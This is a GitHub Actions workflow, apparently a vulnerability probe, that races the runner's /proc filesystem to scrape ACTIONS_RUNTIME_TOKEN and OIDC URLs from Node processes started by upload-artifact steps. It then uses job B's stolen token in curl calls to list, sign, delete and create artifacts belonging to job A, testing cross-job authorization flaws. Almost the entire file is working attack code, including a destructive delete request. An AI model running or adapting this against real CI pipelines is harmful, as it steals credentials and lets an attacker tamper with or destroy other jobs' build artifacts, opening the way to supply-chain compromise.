name: ZeroDayProbe11
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write

jobs:
  job-a:
    runs-on: ubuntu-latest
    steps:
      - name: Grab job-A token + export IDs
        run: |
          cat > /tmp/grab_a.sh << 'GRABEOF'
          #!/bin/bash
          echo "=GRAB_A_START="
          for i in $(seq 1 300); do
            for pid in $(ls /proc/ 2>/dev/null | grep -E "^[0-9]+$"); do
              cmd=$(cat /proc/$pid/cmdline 2>/dev/null | tr "\0" " " | head -c 200)
              if echo "$cmd" | grep -qiE "^node |node /"; then
                envdata=$(cat /proc/$pid/environ 2>/dev/null | base64 -w0 || true)
                if [ -n "$envdata" ] && echo "$envdata" | base64 -d 2>/dev/null | grep -q ACTIONS_RUNTIME_TOKEN; then
                  echo "GOT_A_PID=$pid ITER=$i"
                  RT=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_RUNTIME_TOKEN=" | cut -d= -f2-)
                  OIDC_URL=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_ID_TOKEN_REQUEST_URL=" | cut -d= -f2-)
                  RESULTS_URL=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_RESULTS_URL=" | cut -d= -f2-)
                  printf '%s' "$RT" > /tmp/ZD_A_RT.txt
                  printf '%s' "$OIDC_URL" > /tmp/ZD_A_OIDC_URL.txt
                  printf '%s' "$RESULTS_URL" > /tmp/ZD_A_RESULTS_URL.txt
                  echo "DONE" > /tmp/ZD_A_STATUS.txt
                  echo "RT_LEN=${#RT} RESULTS_URL=$RESULTS_URL"
                  break 2
                fi
              fi
            done
            sleep 0.1
          done
          echo "=GRAB_A_DONE="
          GRABEOF
          chmod +x /tmp/grab_a.sh
          echo "probe_a" > /tmp/probe_a.txt
          rm -f /tmp/ZD_A_STATUS.txt
          nohup bash /tmp/grab_a.sh > /tmp/grab_a.log 2>&1 &
          echo $! > /tmp/bgpid_a.txt
          sleep 1

      - name: Upload artifact A (triggers Node with ACTIONS_RUNTIME_TOKEN)
        uses: actions/upload-artifact@v4
        with:
          name: probe-a
          path: /tmp/probe_a.txt

      - name: Analyze + export job-A IDs
        run: |
          for i in $(seq 1 30); do
            [ -f /tmp/ZD_A_STATUS.txt ] && grep -q DONE /tmp/ZD_A_STATUS.txt && echo "A_GRABBED iter=$i" && break
            sleep 1
          done
          kill $(cat /tmp/bgpid_a.txt) 2>/dev/null || true
          cat /tmp/grab_a.log 2>/dev/null || echo "NO_GRAB_A_LOG"

          RT=$(cat /tmp/ZD_A_RT.txt 2>/dev/null)
          OIDC_URL=$(cat /tmp/ZD_A_OIDC_URL.txt 2>/dev/null)
          RESULTS_URL=$(cat /tmp/ZD_A_RESULTS_URL.txt 2>/dev/null)

          [ -z "$RT" ] && echo "NO_TOKEN_A" && exit 1

          PLAN_ID=$(echo "$OIDC_URL" | grep -oE 'idtoken/[^/]+' | cut -d/ -f2)
          JOB_ID=$(echo "$OIDC_URL" | grep -oE 'idtoken/[^/]+/[^?]+' | cut -d/ -f3)
          echo "JOB_A_PLAN=$PLAN_ID JOB_A_JOB=$JOB_ID"

          # Write IDs for job-b
          printf '%s\n%s\n%s\n' "PLAN_ID=$PLAN_ID" "JOB_ID=$JOB_ID" "RESULTS_URL=$RESULTS_URL" > /tmp/job_a_ids.txt

      - name: Upload job-A IDs for job-B
        uses: actions/upload-artifact@v4
        with:
          name: job-a-ids
          path: /tmp/job_a_ids.txt

  job-b:
    runs-on: ubuntu-latest
    needs: job-a
    steps:
      - name: Grab job-B token (inline proc-race with max attempts)
        run: |
          echo "probe_b" > /tmp/probe_b.txt
          cat > /tmp/grab_b.sh << 'GRABEOF'
          #!/bin/bash
          echo "=GRAB_B_START= ts=$(date -u +%s)"
          for i in $(seq 1 600); do
            for pid in $(ls /proc/ 2>/dev/null | grep -E "^[0-9]+$"); do
              cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr "\0" " " | head -c 200)
              if echo "$cmdline" | grep -qiE "^node |node /"; then
                envdata=$(cat /proc/$pid/environ 2>/dev/null | base64 -w0 2>/dev/null || true)
                if [ -n "$envdata" ] && echo "$envdata" | base64 -d 2>/dev/null | grep -q ACTIONS_RUNTIME_TOKEN; then
                  echo "GOT_B_PID=$pid ITER=$i"
                  RT=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_RUNTIME_TOKEN=" | cut -d= -f2-)
                  OIDC_URL=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_ID_TOKEN_REQUEST_URL=" | cut -d= -f2-)
                  RESULTS_URL=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_RESULTS_URL=" | cut -d= -f2-)
                  printf '%s' "$RT" > /tmp/ZD_B_RT.txt
                  printf '%s' "$OIDC_URL" > /tmp/ZD_B_OIDC_URL.txt
                  printf '%s' "$RESULTS_URL" > /tmp/ZD_B_RESULTS_URL.txt
                  echo "DONE" > /tmp/ZD_B_STATUS.txt
                  echo "RT_B_LEN=${#RT} B_OIDC_URL=$OIDC_URL"
                  break 2
                fi
              fi
            done
            sleep 0.1
          done
          echo "=GRAB_B_DONE= ts=$(date -u +%s)"
          GRABEOF
          chmod +x /tmp/grab_b.sh
          rm -f /tmp/ZD_B_STATUS.txt /tmp/ZD_B_RT.txt
          nohup bash /tmp/grab_b.sh > /tmp/grab_b.log 2>&1 &
          echo $! > /tmp/bgpid_b.txt
          echo "GRAB_B_BG_STARTED PID=$(cat /tmp/bgpid_b.txt)"
          sleep 1

      - name: Upload artifact B (Node trigger #1)
        uses: actions/upload-artifact@v4
        with:
          name: probe-b
          path: /tmp/probe_b.txt

      - name: Upload artifact B2 (Node trigger #2 for token grab)
        uses: actions/upload-artifact@v4
        with:
          name: probe-b2
          path: /tmp/probe_b.txt
          overwrite: true

      - name: Download job-A IDs (Node trigger #3)
        uses: actions/download-artifact@v4
        with:
          name: job-a-ids
          path: /tmp/job_a_data/

      - name: Cross-job BOLA test
        run: |
          for i in $(seq 1 20); do
            [ -f /tmp/ZD_B_STATUS.txt ] && grep -q DONE /tmp/ZD_B_STATUS.txt && echo "B_GRABBED iter=$i" && break
            sleep 1
          done
          kill $(cat /tmp/bgpid_b.txt) 2>/dev/null || true
          echo "=GRAB_B_LOG="
          cat /tmp/grab_b.log 2>/dev/null || echo "NO_GRAB_B_LOG"
          echo "=GRAB_B_LOG_END="

          RT_B=$(cat /tmp/ZD_B_RT.txt 2>/dev/null)
          B_OIDC_URL=$(cat /tmp/ZD_B_OIDC_URL.txt 2>/dev/null)
          RESULTS_URL=$(cat /tmp/ZD_B_RESULTS_URL.txt 2>/dev/null)

          echo "RT_B_LEN=${#RT_B}"
          [ -z "$RT_B" ] && echo "NO_TOKEN_B — BOLA tests skipped" && exit 0

          B_PLAN=$(echo "$B_OIDC_URL" | grep -oE 'idtoken/[^/]+' | cut -d/ -f2)
          B_JOB=$(echo "$B_OIDC_URL" | grep -oE 'idtoken/[^/]+/[^?]+' | cut -d/ -f3)
          echo "JOB_B_PLAN=$B_PLAN JOB_B_JOB=$B_JOB"

          A_PLAN=$(grep "^PLAN_ID=" /tmp/job_a_data/job_a_ids.txt | cut -d= -f2-)
          A_JOB=$(grep "^JOB_ID=" /tmp/job_a_data/job_a_ids.txt | cut -d= -f2-)
          echo "JOB_A_PLAN=$A_PLAN JOB_A_JOB=$A_JOB"
          echo "SAME_PLAN=$([ "$A_PLAN" = "$B_PLAN" ] && echo YES || echo NO)"

          echo "=CROSS_JOB_BOLA="

          echo "T1 ListArtifacts job-A job_id via job-B token (SAME PLAN expected):"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\"}"
          echo ""

          echo "T2 GetSignedArtifactURL probe-a via job-B token:"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"probe-a\"}"
          echo ""

          echo "T3 DeleteArtifact probe-a via job-B token (DESTRUCTIVE):"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"probe-a\"}"
          echo ""

          echo "T4 CreateArtifact in job-A namespace via job-B token:"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"injected-by-b\",\"version\":4}"
          echo ""

          echo "T5 ListArtifacts OWN PLAN + job-A job_id (cross-job within run):"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$B_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\"}"
          echo ""

          echo "T6 ListArtifacts with MISMATCHED plan (job-B plan, job-A job_id):"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$B_PLAN\",\"workflowJobRunBackendId\":\"$B_JOB\"}"
          echo ""

          echo "=CROSS_JOB_BOLA_END="
